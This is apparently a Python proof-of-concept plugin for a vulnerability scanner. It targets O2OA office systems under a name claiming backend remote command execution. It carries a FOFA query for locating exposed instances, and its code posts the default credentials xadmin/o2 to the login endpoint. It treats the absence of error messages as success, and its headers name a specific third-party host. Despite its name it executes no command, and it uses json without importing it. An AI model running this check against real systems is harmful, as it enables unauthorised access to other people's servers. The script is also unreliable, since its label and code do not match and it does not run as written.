import requests
from base_poc import base_poc


fofa_key = 'title=="O2OA"'
bug_name = "O2OA_后台远程命令执行漏洞"


class POC(base_poc):
    def pyload(self):
        body = {
            "credential": "xadmin",
            "password": "o2",
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "text/html,application/json,*/*",
            "Accept-Language": "zh-CN",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json; charset=utf-8",
            "Authorization": "anonymous",
            "Content-Length": "109",
            "Origin": "http://oa01.yunli360.com:8080",
            "Connection": "close",
            "Referer": "http://oa01.yunli360.com:8080/x_desktop/index.html",
            "Cookie": "x-token=anonymous",
        }
        response = requests.post(
            self._url
            + "/x_organization_assemble_authentication/jaxrs/authentication/captcha?v=7.2 ",
            data=json.dumps(body),
            headers=headers,
        )
        if "用户不存在或者密码错误" not in response.text and "图片验证码不能为空" not in response.text:
            return True
        return False
